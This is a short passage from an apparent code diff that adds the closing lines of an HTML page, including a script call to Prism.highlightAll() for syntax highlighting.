+        Prism.highlightAll();
+      </script>
+</html>
